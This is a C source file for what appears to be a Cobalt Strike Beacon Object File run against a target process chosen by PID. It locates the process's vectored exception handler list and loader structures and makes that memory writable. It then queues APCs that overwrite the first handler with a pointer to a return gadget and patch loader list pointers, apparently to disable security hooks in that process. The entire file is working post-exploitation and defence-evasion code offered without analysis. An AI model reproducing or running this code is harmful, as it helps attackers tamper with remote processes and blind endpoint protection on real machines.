#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"

void GetShit(PVOID* pReturn, PVOID* pLdrpVectorHandlerList) {

    HMODULE ntdll = KERNEL32$GetModuleHandleA("NTDLL.DLL");
    ULONG64 list = (ULONG64)KERNEL32$GetProcAddress(ntdll, "RtlRemoveVectoredExceptionHandler");

    while (*(BYTE*)list != 0xcc) {

        if (*(BYTE*)list == 0xe9) {

            list = list + 5 + *(int*)(list + 1);

            while (((*(ULONG*)list) & 0xffffff) != 0x258d4c) {
                list = list + 1;
            }
        
            list = list + 7 + *(int*)(list + 3);
            *pLdrpVectorHandlerList = (PVOID)list;
            break;
        }

        list = list + 1;
    }

    HMODULE ret = KERNEL32$GetModuleHandleA("KERNELBASE.DLL");

    ret += 0x1000;

    while (((*(ULONG64*)ret) & 0xffffffffffff) != 0xc3ffffffffb8) {
    	ret = ret + 1;
    }

    *pReturn = (PVOID)ret;
}

BOOL FixShit(ULONG pid) {

    ULONG   ret,
            old;

    HANDLE  hThread,
            hProcess = NULL;

    PVOID   pHandlerList,
            pRetExec,
            pPointer,
            pAligned,
            pLdr,
            pFree   = NULL;

    BOOL        bSuccess    = FALSE;
    SIZE_T      szMem       = PAGE_SIZE * 2;
    NTSTATUS    STATUS      = 0x00;

    VECTORED_HANDLER_LIST       list    = { 0 };
    OBJECT_ATTRIBUTES           oa      = { 0 };
    PROCESS_BASIC_INFORMATION   pbi     = { 0 };
    CLIENT_ID                   cid     = { .UniqueProcess = pid };

    GetShit(&pRetExec, &pHandlerList);

    if ((STATUS = NTDLL$NtOpenProcess(&hProcess, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &oa, &cid)) != 0x00) {
        BeaconPrintf(CALLBACK_ERROR, "NtOpenProcess: 0x%0.8X", STATUS);
        goto _End;
    }

    if ((STATUS = NTDLL$NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL)) != 0x00) {
        BeaconPrintf(CALLBACK_ERROR, "NtQueryInformationProcess: 0x%0.8X", STATUS);
        goto _End;
    }

    do {

        if ((STATUS = NTDLL$NtReadVirtualMemory(hProcess, (PVOID)((ULONG_PTR)pbi.PebBaseAddres + 0x18), &pLdr, sizeof(PVOID), NULL)) != 0x00) {
            break;
        }

        if ((STATUS = NTDLL$NtReadVirtualMemory(hProcess, (PVOID)((ULONG_PTR)pLdr + 0x20), &pLdr, sizeof(PVOID), NULL)) != 0x00) {
            break;
        }

        if ((STATUS = NTDLL$NtReadVirtualMemory(hProcess, pLdr, &pLdr, sizeof(PVOID), NULL)) != 0x00) {
            break;
        }

        if ((STATUS = NTDLL$NtReadVirtualMemory(hProcess, pHandlerList, &list, sizeof(list), NULL)) != 0x00) {
            break;
        }

    } while (FALSE);

    if (STATUS != 0x00) {
        BeaconPrintf(CALLBACK_ERROR, "NtReadVirtualMemory somewhere: 0x%0.8X", STATUS);
        goto _End;
    }

    pPointer = (PVOID)((ULONG_PTR)list.FirstVEH + 32);
    pAligned = (PVOID)(((ULONG_PTR)list.FirstVEH & ~(PAGE_SIZE - 1)));

    NTDLL$NtClose(hProcess);

    STATUS = NTDLL$NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ret);

    ret += PAGE_SIZE;
    SYSTEM_PROCESS_INFORMATION* pInfo = (SYSTEM_PROCESS_INFORMATION*)NTDLL$RtlAllocateHeap(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ret);

    if (!pInfo) goto _End;
    pFree = pInfo;
    if ((STATUS = NTDLL$NtQuerySystemInformation(SystemProcessInformation, pInfo, ret, &ret)) != 0x00) goto _End;

    while (TRUE) {

        if (pInfo->UniqueProcessId == pid) {

            if ((STATUS = NTDLL$NtOpenThread(&hThread, THREAD_SET_CONTEXT, &oa, &pInfo->Threads[0].ClientId)) != 0x00) {
                BeaconPrintf(CALLBACK_ERROR, "NtOpenThread: 0x%0.8X", STATUS);
                goto _End;
            }

            if (list.FirstVEH != (PVOID)((ULONG_PTR)pHandlerList + 8)) {

                if ((STATUS = NTDLL$NtOpenProcess(&hProcess, PROCESS_VM_OPERATION, &oa, &cid)) != 0x00) {
                    BeaconPrintf(CALLBACK_ERROR, "NtOpenProcess: 0x%0.8X", STATUS);
                    goto _End;
                }

                //First entry usually in RO memory, we can just leave it as RW
                if ((STATUS = NTDLL$NtProtectVirtualMemory(hProcess, &pAligned, &szMem, PAGE_READWRITE, &old)) != 0x00) {
                    BeaconPrintf(CALLBACK_ERROR, "NtProtectVirtualMemory: 0x%0.8X", STATUS);
                    goto _End;
                }

                if ((STATUS = NTDLL$NtQueueApcThreadEx(hThread, (HANDLE)0x1, NTDLL$RtlEncodeRemotePointer, (HANDLE)-1, pRetExec, pPointer)) != 0x00) {
                    BeaconPrintf(CALLBACK_ERROR, "NtQueueApcThreadEx: 0x%0.8X", STATUS);
                    goto _End;
                }
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[i] No VEH found");
            }

            if ((STATUS = NTDLL$NtQueueApcThreadEx(hThread, (HANDLE)0x1, NTDLL$memcpy, (PVOID*)((ULONG_PTR)pLdr + 0x20), (PVOID)((ULONG_PTR)pLdr + 0xe8), (PVOID)sizeof(PVOID))) != 0x00) {
                BeaconPrintf(CALLBACK_ERROR, "NtQueueApcThreadEx: 0x%0.8X", STATUS);
                goto _End;
            }

            bSuccess = TRUE;
            break;
        }

        if (!pInfo->NextEntryOffset) break;
        pInfo = (SYSTEM_PROCESS_INFORMATION*)((ULONG_PTR)pInfo + pInfo->NextEntryOffset);
    }

_End:
    if (pFree) NTDLL$RtlFreeHeap(KERNEL32$GetProcessHeap(), 0, pFree);
    if (hThread) NTDLL$NtClose(hThread);
    if (hProcess) NTDLL$NtClose(hProcess);
    return bSuccess;
}

void go(char* args, int argc) {

    datap parser;

    BeaconDataParse(&parser, args, argc);
    ULONG pid = BeaconDataInt(&parser);

    if (FixShit(pid)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Done, maybe wait a bit for APCs to exec");
    }
}